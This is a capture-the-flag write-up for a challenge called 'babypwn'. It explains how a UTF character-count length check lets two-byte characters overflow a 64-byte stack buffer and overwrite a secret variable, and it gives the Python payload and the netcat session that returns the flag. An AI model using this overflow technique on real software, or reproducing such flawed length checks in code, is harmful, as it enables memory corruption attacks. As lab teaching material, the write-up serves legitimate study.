# babypwn

## Challenge Description

We're given the cpp source code to binary and a server to connect to.
The binary takes in input from a user and prints it back to the user.
There is a secret variable that we need to modify to get the flag.

```cpp
const char secret[5]="1234";
...
if (secret[0]=='p' and secret[1]=='i' and secret[2]=='n' and secret[3]=='g' )
{
    cout << "fake flag"<<endl;
}
```

## Checking stack offsets

I opened the binary in binary ninja and checked the stack offsets of the variables.
The secret variable is at offset `-0x1d`.
and the name_buf is at offset `-0x68`.

`0x68 - 0x1d = 0x4b (75 in decimal)`

## Vulnerability

The buffer size is 64 bytes, but the fgets reads 256 bytes.
There is however a safety net in place.

```cpp
size_t user_inp_size = ww898::utf::size(inp_buf);
if (user_inp_size > name_buf_size)
{
    cout << "buffer overflow detected"<<endl;
    return 0;
}
while (inp_buf[i] != '\n')
{
    name_buf[i] = inp_buf[i];
    i++;
}
```

The vulnerability lies in how the size of the input is calculated.
The size of the input is calculated using `ww898::utf::size(inp_buf)`.
This function calculates the size using the number of characters in the input and not the number of bytes.
This allows us to enter special UTF characters that are 2 bytes in size rather than 1 byte.

## Solution

```python
payload = 37*'È' + '0' + 'ping'
print(payload)
```

```
$ nc ip port
Enter your name:
ÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈ0ping
Hello: ÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈÈ0ping
ping{b3g1nn3r_fr13nd1y_bu773r_0v3rfl0w}
```
